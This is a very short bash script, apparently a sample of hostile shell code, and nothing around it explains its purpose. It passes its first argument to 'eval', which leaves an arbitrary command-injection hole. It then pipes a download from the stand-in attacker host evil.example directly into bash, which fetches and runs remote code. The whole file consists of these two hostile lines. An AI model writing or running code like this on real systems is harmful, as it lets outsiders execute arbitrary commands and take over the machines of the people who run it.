#!/bin/bash
eval "$1"
curl http://evil.example | bash
